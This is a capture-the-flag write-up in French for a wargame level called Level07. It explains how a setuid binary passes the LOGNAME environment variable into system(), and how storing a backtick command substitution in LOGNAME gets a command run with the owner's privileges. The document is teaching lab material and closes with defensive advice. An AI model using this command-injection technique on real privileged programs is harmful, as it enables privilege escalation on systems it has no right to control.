# Level07

## Résumé en une phrase

Le home de `level07` contient un binaire **setuid `flag07`** qui lit la variable
d'environnement **`LOGNAME`** et la **recolle dans une commande shell** exécutée
via `system()` (`/bin/echo <LOGNAME>`). Comme c'est **moi** qui contrôle mes
variables d'environnement, j'y place une **substitution de commande** qui lance
`getflag` : elle s'exécute alors en `flag07`. C'est une **injection de commande
via variable d'environnement** (cousine du level04).

---

## Reconnaissance

```bash
ls -la          # le home contient un binaire "level07"
file level07    # ELF -> binaire compilé, illisible avec cat
```

`file` confirme un **binaire compilé** (pas un script). On ne peut donc pas lire
son code : on l'observe « de l'extérieur ».

Vérification du bit setuid :

```bash
ls -l level07
# -rwsr-sr-x 1 flag07 flag07 ... level07
```

Le `s` de `rws` = **setuid**, propriétaire **`flag07`** → le programme s'exécute
avec les droits de flag07, quel que soit celui qui le lance.

---

## Observation avec `ltrace`

`ltrace` = *library trace* : il lance le programme et affiche **en direct chaque
appel de fonction de bibliothèque** avec ses arguments. C'est notre mouchard.

```bash
ltrace ./level07
```

Deux lignes décisives :

```
getenv("LOGNAME")            = "level07"
asprintf(...)                = 18
system("/bin/echo level07 ")
```

Traduction :

- **`getenv("LOGNAME")`** : le programme **lit la variable d'environnement**
  `LOGNAME`. Les variables d'environnement sont des réglages que **l'utilisateur
  contrôle** (`export LOGNAME=...`). Le programme lit donc une valeur que je peux
  fixer moi-même.
- **`asprintf(...)`** : **fabrique une chaîne** en assemblant des morceaux. Ici
  elle construit `"/bin/echo " + LOGNAME + " "`.
- **`system("/bin/echo level07 ")`** : `system()` **exécute une commande** comme
  si on la tapait dans un terminal. La commande finale est donc
  `/bin/echo <contenu de LOGNAME>`.

Schéma de la commande construite :

```
/bin/echo  +  <LOGNAME>  +  " "
```

---

## Le point critique

Ma valeur `LOGNAME` est **collée telle quelle dans une commande shell exécutée en
`flag07`**. Or `system()` passe par un shell, et un shell **interprète** la
**substitution de commande** :

- **`` `commande` ``** (backticks) ou **`$(commande)`** disent au shell :
  *« exécute d'abord ceci, puis remplace-le par son résultat »*.

Si `LOGNAME` contient une substitution de commande, cette commande s'exécutera
**au moment où le binaire lance `system()`**, donc **en `flag07`**.

Visualisation de la différence des quotations:

```bash
export A="$(date)"   # A = la date de MAINTENANT (exécuté tout de suite)
export B='$(date)'   # B = le texte littéral  $(date)  (jamais exécuté par mon shell)
echo "$A"            # -> horodatage figé
echo "$B"            # -> affiche littéralement:  $(date)
```

---

## Exploitation

1. **Définir `LOGNAME` avec des simples guillemets** pour stocker la substitution
   *sans* l'exécuter tout de suite :

   ```bash
   export LOGNAME='`getflag`'
   ```

2. **Vérifier que l'évaluation est bien différée** :

   ```bash
   env | grep LOGNAME
   # attendu :  LOGNAME=`getflag`     (les backticks VISIBLES, texte littéral)
   # PAS :      LOGNAME=Check flag... (= getflag déjà exécuté trop tôt -> raté)
   ```

3. **Lancer le binaire** : c'est lui (en flag07) qui exécute enfin la recette :

   ```bash
   ./level07
   # /bin/echo `getflag`  ->  le shell exécute getflag EN flag07  ->  token affiché
   ```

Le token de flag07 s'affiche alors dans la sortie.

---

## Pourquoi ça marche

1. Le binaire tourne **en `flag07`** (bit setuid).
2. Il réinjecte une **variable d'environnement contrôlée par l'utilisateur**
   (`LOGNAME`) dans une commande shell (`system()`).
3. Le shell **interprète la substitution de commande** contenue dans cette
   valeur.
4. En stockant la substitution **non évaluée** (simples guillemets), on la fait
   exécuter **au bon moment**, par le processus flag07 → exécution de code en
   `flag07`.

C'est la combinaison **setuid + `system()` + valeur d'environnement non
nettoyée** qui crée la faille (même famille que le PATH du level03 et l'injection
du level04).

---

## Sécurité

- **Un programme setuid ne doit jamais réinjecter une variable d'environnement
  dans un `system()`.** L'environnement est **entièrement** sous le contrôle de
  l'utilisateur ; lui faire confiance revient à laisser l'utilisateur écrire une
  partie de la commande.
- **Éviter `system()`** (qui passe par un shell) au profit d'appels stricts comme
  `execve()` avec un chemin absolu, une liste d'arguments et un environnement
  maîtrisé.
- **Nettoyer / réinitialiser l'environnement** au démarrage d'un binaire
  privilégié (`PATH`, `LOGNAME`, `IFS`, `LD_PRELOAD`…).
- Règle constante des niveaux précédents : plus un programme a de privilèges,
  moins il doit faire confiance à ce qui vient de l'extérieur.
